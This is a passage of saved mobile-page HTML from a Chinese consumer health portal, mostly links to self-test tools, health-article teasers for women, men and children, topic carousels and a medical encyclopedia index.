                                                        alt="女性肾虚自测" src="./99健康网_99相伴健康一生_files/nvsxzc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/nvsxzc/" title="女性肾虚自测">女性肾虚自测</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/fk/rfjkzc/" title="乳房健康自测">
                                            <mip-img title="乳房健康自测" alt="乳房健康自测"
                                                     src="//css1.99.com.cn/css/newsm/images/rfjkzc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="乳房健康自测"
                                                        alt="乳房健康自测" src="./99健康网_99相伴健康一生_files/rfjkzc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/fk/rfjkzc/" title="乳房健康自测">乳房健康自测</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/bj/smzazc/" title="睡眠障碍自测">
                                            <mip-img title="睡眠障碍自测" alt="睡眠障碍自测"
                                                     src="//css1.99.com.cn/css/newsm/images/smzazc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="睡眠障碍自测"
                                                        alt="睡眠障碍自测" src="./99健康网_99相伴健康一生_files/smzazc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/bj/smzazc/" title="睡眠障碍自测">睡眠障碍自测</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/jlcs/" title="酒量计算器">
                                            <mip-img title="酒量计算器" alt="酒量计算器"
                                                     src="//css1.99.com.cn/css/newsm/images/jlcs.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="酒量计算器" alt="酒量计算器"
                                                        src="./99健康网_99相伴健康一生_files/jlcs.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/jlcs/" title="酒量计算器">酒量计算器</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/zyk/zytzzc/" title="寒热体质自测">
                                            <mip-img title="寒热体质自测" alt="寒热体质自测"
                                                     src="//css1.99.com.cn/css/newsm/images/zytzzc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="寒热体质自测"
                                                        alt="寒热体质自测" src="./99健康网_99相伴健康一生_files/zytzzc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/zyk/zytzzc/" title="寒热体质自测">寒热体质自测</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/nan/qlxycs/" title="男性前列腺炎测试">
                                            <mip-img title="男性前列腺炎测试" alt="男性前列腺炎测试"
                                                     src="//css1.99.com.cn/css/newsm/images/qlxycs.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="男性前列腺炎测试"
                                                        alt="男性前列腺炎测试" src="./99健康网_99相伴健康一生_files/qlxycs.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/nan/qlxycs/" title="男性前列腺炎测试">男性前列腺炎测试</a>
                                    </dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/nan/zjywzc/" title="真假阳痿自测">
                                            <mip-img title="真假阳痿自测" alt="真假阳痿自测"
                                                     src="//css1.99.com.cn/css/newsm/images/zjywzc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="真假阳痿自测"
                                                        alt="真假阳痿自测" src="./99健康网_99相伴健康一生_files/zjywzc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/nan/zjywzc/" title="真假阳痿自测">真假阳痿自测</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/jf/jrllzc/" title="肌肉力量自测">
                                            <mip-img title="肌肉力量自测" alt="肌肉力量自测"
                                                     src="//css1.99.com.cn/css/newsm/images/jrllzc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="肌肉力量自测"
                                                        alt="肌肉力量自测" src="./99健康网_99相伴健康一生_files/jrllzc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/jf/jrllzc/" title="肌肉力量自测">肌肉力量自测</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/nnhdj/" title="测一测你能活多少岁">
                                            <mip-img title="测一测你能活多少岁" alt="测一测你能活多少岁"
                                                     src="//css1.99.com.cn/css/newsm/images/nnhdj.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="测一测你能活多少岁"
                                                        alt="测一测你能活多少岁" src="./99健康网_99相伴健康一生_files/nnhdj.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/nnhdj/" title="测一测你能活多少岁">测一测你能活多少岁</a>
                                    </dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/jf/jcdxzc/" title="人体基础代谢率自测">
                                            <mip-img title="人体基础代谢率自测" alt="人体基础代谢率自测"
                                                     src="//css1.99.com.cn/css/newsm/images/jcdxzc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="人体基础代谢率自测"
                                                        alt="人体基础代谢率自测" src="./99健康网_99相伴健康一生_files/jcdxzc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/jf/jcdxzc/" title="人体基础代谢率自测">人体基础代谢率自测</a>
                                    </dd>
                                </dl>
                            </li>

                        </ul>
                    </div>
                    <div class="xw-mask-right"></div>
                </div>
            </div>
        </div>
    </section>
    <section class="health-box">
        <div class="health-top">
            <h2>人群养生</h2>
        </div>
        <mip-vd-tabs class="mip-element mip-layout-container mip-vd-tabs">
            <section class="mip-vd-tabs-row-tile">


                <div class="mip-vd-tabs-nav">
                    <li class="mip-vd-tabs-nav-selected mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="0"><span
                                class="h-curr">女性</span></li>
                    <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="1"><span>男性</span></li>
                </div>
            </section>

            <div class="swiper-slide2 mip-vd-tabs-content"
                 style="display: block; transform-origin: 0px 0px 0px; opacity: 1; transform: scale(1, 1);">
                <div class="health-cont">
                    <ul class="health-text1">
                        <li><a href="https://mip.99.com.cn/a/752484/" title="女性喝碳酸饮料这四大危害 你知道吗">
                                <mip-img title="女性喝碳酸饮料这四大危害 你知道吗"
                                         src="http://img.99.com.cn/uploads/190111/58_163716_1_lit.jpg?330_200"
                                         alt="女性喝碳酸饮料这四大危害 你知道吗" class="mip-element mip-layout-container mip-img-loaded">
                                    <img class="mip-fill-content mip-replaced-content" title="女性喝碳酸饮料这四大危害 你知道吗"
                                         src="./99健康网_99相伴健康一生_files/58_163716_1_lit.jpg" alt="女性喝碳酸饮料这四大危害 你知道吗"></mip-img>
                                <span>女性喝碳酸饮料这四大危害 你知道吗</span></a></li>
                        <li><a href="https://mip.99.com.cn/a/752458/" title="葡萄干有补血功效 女性吃有这四大好处">
                                <mip-img title="葡萄干有补血功效 女性吃有这四大好处"
                                         src="http://img.99.com.cn/uploads/190110/58_150052_1_lit.jpg?330_200"
                                         alt="葡萄干有补血功效 女性吃有这四大好处" class="mip-element mip-layout-container mip-img-loaded">
                                    <img class="mip-fill-content mip-replaced-content" title="葡萄干有补血功效 女性吃有这四大好处"
                                         src="./99健康网_99相伴健康一生_files/58_150052_1_lit.jpg" alt="葡萄干有补血功效 女性吃有这四大好处">
                                </mip-img>
                                <span>葡萄干有补血功效 女性吃有这四大好处</span></a></li>

                    </ul>
                    <a href="https://mip.99.com.cn/a/752456/" title="排卵期到来有哪些信号 体温会比平时高" class="health-text2">
                        <dl>
                            <dt>
                                <h3>排卵期到来有哪些信号 体温会比平时高</h3>
                                <p>排卵期是女性重要的一个时期，那么女性</p>
                            </dt>
                            <dd>
                                <mip-img title="排卵期到来有哪些信号 体温会比平时高"
                                         src="http://img.99.com.cn/uploads/190110/58_142938_1_lit.jpg?330_200"
                                         alt="排卵期到来有哪些信号 体温会比平时高"
                                         class="mip-element mip-layout-container mip-img-loaded"><img
                                            class="mip-fill-content mip-replaced-content" title="排卵期到来有哪些信号 体温会比平时高"
                                            src="./99健康网_99相伴健康一生_files/58_142938_1_lit.jpg" alt="排卵期到来有哪些信号 体温会比平时高">
                                </mip-img>
                            </dd>
                        </dl>
                    </a>
                    <a href="https://mip.99.com.cn/a/752429/" title="治痛经先暖宫 这些暖宫食谱请收藏" class="health-text2">
                        <dl>
                            <dt>
                                <h3>治痛经先暖宫 这些暖宫食谱请收藏</h3>
                                <p>痛经是很折磨人的。女性想要避免痛经的</p>
                            </dt>
                            <dd>
                                <mip-img title="治痛经先暖宫 这些暖宫食谱请收藏"
                                         src="http://img.99.com.cn/uploads/190109/432_102526_1_lit.jpg?330_200"
                                         alt="治痛经先暖宫 这些暖宫食谱请收藏" class="mip-element mip-layout-container mip-img-loaded">
                                    <img class="mip-fill-content mip-replaced-content" title="治痛经先暖宫 这些暖宫食谱请收藏"
                                         src="./99健康网_99相伴健康一生_files/432_102526_1_lit.jpg" alt="治痛经先暖宫 这些暖宫食谱请收藏">
                                </mip-img>
                            </dd>
                        </dl>
                    </a>

                </div>
                <div class="h-more"><a href="https://mip.99.com.cn/ch/6/">点击查看更多...</a></div>
            </div>
            <div class="swiper-slide2 mip-vd-tabs-content" style="display: none;">
                <div class="health-cont">
                    <a href="https://mip.99.com.cn/a/751993/" title="这三种男人老的快 男人如何抗衰老" class="health-text3">
                        <dl>
                            <dt>
                                <mip-img title="这三种男人老的快 男人如何抗衰老"
                                         src="http://img.99.com.cn/uploads/181224/106_144644_1_lit.jpg?230_150"
                                         alt="这三种男人老的快 男人如何抗衰老" class="mip-element mip-layout-container mip-img-loaded">
                                    <img class="mip-fill-content mip-replaced-content" title="这三种男人老的快 男人如何抗衰老"
                                         src="./99健康网_99相伴健康一生_files/106_144644_1_lit.jpg" alt="这三种男人老的快 男人如何抗衰老">
                                </mip-img>
                            </dt>
                            <dd>
                                <h3>这三种男人老的快 男人如何抗衰老</h3>
                                <p>不仅仅是女人怕老，男人也怕。以下这三</p>
                            </dd>
                        </dl>
                    </a>

                    <ul class="h-list">
                        <li><a href="https://mip.99.com.cn/a/752274/" title="男人腰痛的四大原因 多吃富含纤维类食">男人腰痛的四大原因 多吃富含纤维类食</a>
                        </li>
                        <li><a href="https://mip.99.com.cn/a/752066/" title="男人吃姜好吗 听专家来详解">男人吃姜好吗 听专家来详解</a></li>
                        <li><a href="https://mip.99.com.cn/a/751904/" title="男人吃什么可以提高精子质量">男人吃什么可以提高精子质量</a></li>
                        <li><a href="https://mip.99.com.cn/a/751987/" title="男人怎样保护好腰部 四个妙招来帮你">男人怎样保护好腰部 四个妙招来帮你</a>
                        </li>
                        <li><a href="https://mip.99.com.cn/a/751881/" title="男性冬季如何补肾 冬季补肾食谱">男性冬季如何补肾 冬季补肾食谱</a></li>

                    </ul>
                </div>
                <div class="h-more"><a href="https://mip.99.com.cn/ch/5/">点击查看更多...</a></div>
            </div>
        </mip-vd-tabs>
    </section>
    <div class="new-box">
        <div class="new-top">
            <div><h2>健康资讯</h2><i></i><span>分享让大家享受健康</span></div>
        </div>
        <mip-vd-tabs class="mip-element mip-layout-container mip-vd-tabs">
            <section class="new-nav mip-vd-tabs-row-tile">


                <div class="mip-vd-tabs-nav">
                    <li class="mip-vd-tabs-nav-selected mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="0"><span>男科</span>
                    </li>
                    <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="1"><span>妇科</span></li>
                    <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="2"><span>儿科</span></li>
                    <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="3"><span>新闻</span></li>
                </div>
            </section>

            <div class="new-cont mip-vd-tabs-content"
                 style="display: block; transform-origin: 0px 0px 0px; opacity: 1; transform: scale(1, 1);">
                <a href="https://mip.99.com.cn/a/751308/" class="new-text" title="早泄怎么治 多做4种简单运动">
                    <dl>
                        <dt>
                            <mip-img title="早泄怎么治 多做4种简单运动"
                                     src="http://img.99.com.cn/uploads/181129/439_154145_1_lit.jpg?230_150"
                                     alt="早泄怎么治 多做4种简单运动" class="mip-element mip-layout-container mip-img-loaded"><img
                                        class="mip-fill-content mip-replaced-content" title="早泄怎么治 多做4种简单运动"
                                        src="./99健康网_99相伴健康一生_files/439_154145_1_lit.jpg" alt="早泄怎么治 多做4种简单运动"></mip-img>
                        </dt>
                        <dd><h3 title="早泄怎么治 多做4种简单运动">早泄怎么治 多做4种简单运动</h3>
                            <p>对于男人来说，早泄的非常可怕的事情，...</p></dd>
                    </dl>
                </a>

                <ul class="new-list">
                    <li><a href="https://mip.99.com.cn/a/751126/" title="前列腺癌青睐3种男人 你是其一吗？">前列腺癌青睐3种男人 你是其一吗？</a></li>
                    <li><a href="https://mip.99.com.cn/a/750876/" title="冬天吃栗子补肾 推荐4种简单做法">冬天吃栗子补肾 推荐4种简单做法</a></li>
                    <li><a href="https://mip.99.com.cn/a/750547/" title="老公没有性欲 让他吃点黑巧克力">老公没有性欲 让他吃点黑巧克力</a></li>

                </ul>
                <div class="h-more"><a href="https://mip.99.com.cn/ch/629/">点击查看更多....</a></div>
            </div>
            <div class="new-cont mip-vd-tabs-content" style="display: none;">
                <a href="https://mip.99.com.cn/a/752427/" class="new-text" title="产后及时进补才能恢复得快 产妇要这样">
                    <dl>
                        <dt>
                            <mip-img title="产后及时进补才能恢复得快 产妇要这样吃"
                                     src="http://img.99.com.cn/uploads/190109/432_101736_1_lit.jpg?230_150"
                                     alt="产后及时进补才能恢复得快 产妇要这样吃" class="mip-element mip-layout-container mip-img-loaded">
                                <img class="mip-fill-content mip-replaced-content" title="产后及时进补才能恢复得快 产妇要这样吃"
                                     src="./99健康网_99相伴健康一生_files/432_101736_1_lit.jpg" alt="产后及时进补才能恢复得快 产妇要这样吃">
                            </mip-img>
                        </dt>
                        <dd><h3 title="产后及时进补才能恢复得快 产妇要这样">产后及时进补才能恢复得快 产妇要这样</h3>
                            <p>女性生完宝宝以后，自然是要想法子让身...</p></dd>
                    </dl>
                </a>

                <ul class="new-list">
                    <li><a href="https://mip.99.com.cn/a/752426/" title="大姨妈推迟好几天 ?快试试食疗催经手段">大姨妈推迟好几天 ?快试试食疗催经手段</a>
                    </li>
                    <li><a href="https://mip.99.com.cn/a/752417/" title="更年期女性能喝四物汤吗 怎么服用才正">更年期女性能喝四物汤吗 怎么服用才正</a></li>
                    <li><a href="https://mip.99.com.cn/a/752407/" title="产后坐月子可以吃皇帝柑吗 每天几个合">产后坐月子可以吃皇帝柑吗 每天几个合</a></li>

                </ul>
                <div class="h-more"><a href="https://mip.99.com.cn/ch/737/">点击查看更多....</a></div>
            </div>
            <div class="new-cont mip-vd-tabs-content" style="display: none;">
                <a href="https://mip.99.com.cn/a/740724/" class="new-text" title="如何预防小儿感冒 锻炼身体从小做起">
                    <dl>
                        <dt>
                            <mip-img title="如何预防小儿感冒 锻炼身体从小做起"
                                     src="http://img.99.com.cn/uploads/180919/erke51.jpg?230_150"
                                     alt="如何预防小儿感冒 锻炼身体从小做起" class="mip-element mip-layout-container mip-img-loaded">
                                <img class="mip-fill-content mip-replaced-content" title="如何预防小儿感冒 锻炼身体从小做起"
                                     src="./99健康网_99相伴健康一生_files/erke51.jpg" alt="如何预防小儿感冒 锻炼身体从小做起"></mip-img>
                        </dt>
                        <dd><h3 title="如何预防小儿感冒 锻炼身体从小做起">如何预防小儿感冒 锻炼身体从小做起</h3>
                            <p>小孩子的免疫力比较差，小儿感冒是一件...</p></dd>
                    </dl>
                </a>

                <ul class="new-list">
                    <li><a href="https://mip.99.com.cn/a/733103/" title="小儿便秘怎么办 了解原因做好预防">小儿便秘怎么办 了解原因做好预防</a></li>
                    <li><a href="https://mip.99.com.cn/a/727244/" title="解决孩子便秘有什么办法 不妨试试这些">解决孩子便秘有什么办法 不妨试试这些</a></li>
                    <li><a href="https://mip.99.com.cn/a/724508/" title="小孩冬季咳嗽老不好 还可能是这个原因">小孩冬季咳嗽老不好 还可能是这个原因</a></li>

                </ul>
                <div class="h-more"><a href="https://mip.99.com.cn/ch/738/">点击查看更多....</a></div>
            </div>
            <div class="new-cont mip-vd-tabs-content" style="display: none;">
                <a href="https://mip.99.com.cn/a/752477/" class="new-text" title="心脏病产妇拼死产子 有先心病最好别怀">
                    <dl>
                        <dt>
                            <mip-img title="心脏病产妇拼死产子 有先心病要做好孕前检查"
                                     src="http://img.99.com.cn/uploads/190111/106_154119_1_lit.jpg?230_150"
                                     alt="心脏病产妇拼死产子 有先心病要做好孕前检查"
                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                        class="mip-fill-content mip-replaced-content" title="心脏病产妇拼死产子 有先心病要做好孕前检查"
                                        src="./99健康网_99相伴健康一生_files/106_154119_1_lit.jpg" alt="心脏病产妇拼死产子 有先心病要做好孕前检查">
                            </mip-img>
                        </dt>
                        <dd><h3 title="心脏病产妇拼死产子 有先心病最好别怀">心脏病产妇拼死产子 有先心病最好别怀</h3>
                            <p>《人世间》是最近非常火的一个纪录片，...</p></dd>
                    </dl>
                </a>

                <ul class="new-list">
                    <li><a href="https://mip.99.com.cn/a/752473/" title="玩手机摔出脑震荡 经常低头玩手机还有">玩手机摔出脑震荡 经常低头玩手机还有</a></li>
                    <li><a href="https://mip.99.com.cn/a/752472/" title="小心耳聋！经常戴耳机会患噪音性耳聋">小心耳聋！经常戴耳机会患噪音性耳聋</a></li>
                    <li><a href="https://mip.99.com.cn/a/752468/" title="吃绿色食品的这些好处 你都知道吗？">吃绿色食品的这些好处 你都知道吗？</a></li>

                </ul>
                <div class="h-more"><a href="https://mip.99.com.cn/ch/9">点击查看更多....</a></div>
            </div>
        </mip-vd-tabs>
    </div>
    <div class="gallery-box">
        <div class="gary-top"><h2>专题</h2><a href="https://m.99.com.cn/zt/">更多&gt;</a></div>
        <div class="gary-cont">
            <div class="swiper-container7 swiper-container-horizontal">
                <div class="swiper-wrapper2">
                    <mip-vd-tabs type="bottom" class="mip-element mip-layout-container mip-vd-tabs">
                        <div class="mip-vd-tabs-content"
                             style="display: block; transform-origin: 0px 0px 0px; opacity: 1; transform: scale(1, 1);">
                            <ul class="swiper-slide2">
                                <li>
                                    <a href="http://m.99.com.cn/gongju/wx/xzbzc/" title="未来十年你会得心脏病吗">
                                        <mip-img title="未来十年你会得心脏病吗"
                                                 src="http://img.99.com.cn/uploads/180205/106_132441_1.jpg"
                                                 alt="未来十年你会得心脏病吗" class="mip-element mip-layout-container">
                                            <div class="mip-placeholder mip-placeholder-jpg"></div>
                                        </mip-img>
                                    </a>
                                    <p>未来十年你会得心脏病吗</p>
                                </li>
                                <li>
                                    <a href="http://m.99.com.cn/gongju/wx/nvsxzc/" title="女性肾虚自测">
                                        <mip-img title="女性肾虚自测"
                                                 src="http://img.99.com.cn/uploads/180131/106_100657_1.jpg" alt="女性肾虚自测"
                                                 class="mip-element mip-layout-container">
                                            <div class="mip-placeholder mip-placeholder-jpg"></div>
                                        </mip-img>
                                    </a>
                                    <p>女性肾虚自测</p>
                                </li>

                            </ul>
                        </div>
                        <div class="mip-vd-tabs-content" style="display: none;">
                            <ul class="swiper-slide2">
                                <li>
                                    <a href="http://m.99.com.cn/gongju/nan/xnlcs/" title="性能力测试">
                                        <mip-img title="性能力测试"
                                                 src="http://img.99.com.cn/uploads/170926/106_145238_1.jpg" alt="性能力测试"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content" title="性能力测试"
                                                    src="./99健康网_99相伴健康一生_files/106_145238_1.jpg" alt="性能力测试"></mip-img>
                                    </a>
                                    <p>性能力测试</p>
                                </li>
                                <li>
                                    <a href="http://m.99.com.cn/zt/nan/nxys/" title="男人吃什么能补肾壮阳">
                                        <mip-img title="男人吃什么能补肾壮阳" src="http://m.99.com.cn/zt/nan/nxys/images/ban.png"
                                                 alt="男人吃什么能补肾壮阳"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content" title="男人吃什么能补肾壮阳"
                                                    src="./99健康网_99相伴健康一生_files/ban.png" alt="男人吃什么能补肾壮阳"></mip-img>
                                    </a>
                                    <p>男人吃什么能补肾壮阳</p>
                                </li>

                            </ul>
                        </div>
                        <div class="mip-vd-tabs-content" style="display: none;">
                            <ul class="swiper-slide2">
                                <li>
                                    <a href="http://m.99.com.cn/gongju/wx/nnhdj/" title="测一测你能活多少岁">
                                        <mip-img title="测一测你能活多少岁"
                                                 src="http://img.99.com.cn/uploads/171228/106_133653_1.jpg"
                                                 alt="测一测你能活多少岁"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content" title="测一测你能活多少岁"
                                                    src="./99健康网_99相伴健康一生_files/106_133653_1.jpg" alt="测一测你能活多少岁"></mip-img>
                                    </a>
                                    <p>测一测你能活多少岁</p>
                                </li>
                                <li>
                                    <a href="http://m.99.com.cn/zt/nv/nxbj/" title="女人突然闭经是咋回事">
                                        <mip-img title="女人突然闭经是咋回事"
                                                 src="http://img2.99.com.cn/css/diyzt/nxbj_m/images/banner.png"
                                                 alt="女人突然闭经是咋回事"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content" title="女人突然闭经是咋回事"
                                                    src="./99健康网_99相伴健康一生_files/banner.png" alt="女人突然闭经是咋回事"></mip-img>
                                    </a>
                                    <p>女人突然闭经是咋回事</p>
                                </li>

                            </ul>
                        </div>

                        <section class="swiper-pagination1 swiper-pagination-clickable mip-vd-tabs-row-tile">


                            <div class="mip-vd-tabs-nav">
                                <li class="mip-vd-tabs-nav-selected mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="0">
                                    <span class="swiper-pagination-bullet"></span></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="1"><span
                                            class="swiper-pagination-bullet"></span></li>
                                <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="2"><span
                                            class="swiper-pagination-bullet"></span></li>
                            </div>
                        </section>
                    </mip-vd-tabs>
                </div>
            </div>
        </div>
    </div>

    <section class="wrap-box">
        <div class="wrap-top"><h2>健康百科</h2></div>
        <div class="wrap">
            <mip-vd-tabs allow-scroll="" class="mip-element mip-layout-container mip-vd-tabs">
                <section class="wrap-nav mip-vd-tabs-nav-view">


                    <div class="mip-vd-tabs-scroll-touch">
                        <div class="mip-vd-tabs-nav">
                            <li class="swiper-slide wrap-on mip-vd-tabs-nav-selected mip-vd-tabs-nav-li mip-vd-tabs-log"
                                data-tid="0"><span>男科</span></li>
                            <li class="swiper-slide mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="1"><span>妇科</span>
                            </li>
                            <li class="swiper-slide mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="2"><span>整形</span>
                            </li>
                            <li class="swiper-slide mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="3"><span>育儿</span>
                            </li>
                            <li class="swiper-slide mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="4"><span>中医</span>
                            </li>
                            <li class="swiper-slide mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="5"><span>皮肤科</span>
                            </li>
                        </div>
                    </div>
                </section>

                <div class="wrap-swiper mip-vd-tabs-content"
                     style="display: block; transform-origin: 0px 0px 0px; opacity: 1; transform: scale(1, 1);">
                    <div class="sw-items swiper-wrapper2">
                        <div class="wrap-swiper">
                            <ul class="wrap-list sw-item swiper-slide on">

                                <li><a href="https://mip.99.com.cn/baike/jh/42.html" title="泌尿外科疾病">泌尿外科疾病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/43.html" title="前列腺炎">前列腺炎</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/51.html" title="前列腺增生">前列腺增生</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/59.html" title="前列腺癌">前列腺癌</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/68.html" title="阳痿">阳痿</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/76.html" title="早泄">早泄</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/149.html" title="遗精">遗精</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/150.html" title="包皮包茎">包皮包茎</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/151.html" title="肾移植">肾移植</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/170.html" title="男性不育">男性不育</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/171.html" title="性功能障碍">性功能障碍</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/172.html" title="男科生殖整形">男科生殖整形</a></li>


                            </ul>
                        </div>
                    </div>
                </div>
                <div class="wrap-swiper mip-vd-tabs-content" style="display: none;">
                    <div class="sw-items swiper-wrapper2">
                        <div class="wrap-swiper">
                            <ul class="wrap-list sw-item swiper-slide">

                                <li><a href="https://mip.99.com.cn/baike/jh/673.html" title="妇产科检查">妇产科检查</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/674.html" title="妇产科疾病">妇产科疾病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/676.html" title="阴道检查">阴道检查</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/677.html" title="子宫及附件检查">子宫及附件检查</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/678.html" title="盆腔检查">盆腔检查</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/679.html" title="乳房检查">乳房检查</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/680.html" title="其他检查">其他检查</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/971.html" title="附件疾病">附件疾病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/972.html" title="乳房疾病">乳房疾病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/1314.html" title="阴道与外阴疾病">阴道与外阴疾病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/1315.html" title="盆腔疾病">盆腔疾病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/1318.html" title="月经疾病">月经疾病</a></li>


                            </ul>
                        </div>
                    </div>
                </div>
                <div class="wrap-swiper mip-vd-tabs-content" style="display: none;">
                    <div class="sw-items swiper-wrapper2">
                        <div class="wrap-swiper">
                            <ul class="wrap-list sw-item swiper-slide">

                                <li><a href="https://mip.99.com.cn/baike/jh/84.html" title="眼部整形">眼部整形</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/85.html" title="双眼皮">双眼皮</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/86.html" title="开眼角">开眼角</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/87.html" title="去眼袋">去眼袋</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/88.html" title="卧蚕眼">卧蚕眼</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/89.html" title="去黑眼圈">去黑眼圈</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/90.html" title="纹眼线">纹眼线</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/91.html" title="水泡眼整形">水泡眼整形</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/92.html" title="上睑下垂">上睑下垂</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/93.html" title="眼窝凹陷">眼窝凹陷</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/94.html" title="三角眼矫正">三角眼矫正</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/97.html" title="眉部整形">眉部整形</a></li>


                            </ul>
                        </div>
                    </div>
                </div>
                <div class="wrap-swiper mip-vd-tabs-content" style="display: none;">
                    <div class="sw-items swiper-wrapper2">
                        <div class="wrap-swiper">
                            <ul class="wrap-list sw-item swiper-slide">

                                <li><a href="https://mip.99.com.cn/baike/jh/464.html" title="备孕">备孕</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/465.html" title="孕期">孕期</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/466.html" title="分娩">分娩</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/467.html" title="月子">月子</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/468.html" title="新生儿">新生儿</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/469.html" title="0-1岁">0-1岁</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/470.html" title="1-3岁">1-3岁</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/471.html" title="3-6岁">3-6岁</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/472.html" title="二胎">二胎</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/473.html" title="孕前准备">孕前准备</a></li>


